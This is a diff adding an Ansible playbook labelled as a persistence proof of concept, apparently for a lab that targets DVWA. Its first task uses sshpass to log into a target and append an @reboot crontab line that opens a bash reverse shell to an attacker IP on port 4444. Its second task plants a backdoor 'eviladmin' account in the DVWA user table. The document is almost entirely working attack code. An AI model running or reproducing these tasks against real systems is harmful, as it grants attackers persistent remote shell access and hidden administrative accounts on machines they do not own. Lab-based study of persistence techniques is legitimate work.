@@ -1,0 +1,11 @@
+---
+- name: PoC3 Persistence – Cron-based reverse shell
+  shell: |
+    sshpass -p '{{ ssh_password }}' ssh {{ ssh_user }}@{{ privesc_target_ip }} \
+    "echo '@reboot bash -i >& /dev/tcp/{{ attacker_ip }}/4444 0>&1' | sudo tee -a /etc/crontab"
+  failed_when: false
+
+- name: PoC3 Persistence – Create DVWA admin user
+  shell: |
+    mysql -u root dvwa -e "INSERT INTO users (user_id, user, password, avatar, last_login, failed_login) VALUES (6, 'eviladmin', MD5('{{ dvwa_admin_password }}'), 'avatars/admin.jpg', NOW(), 0);"
+  failed_when: false
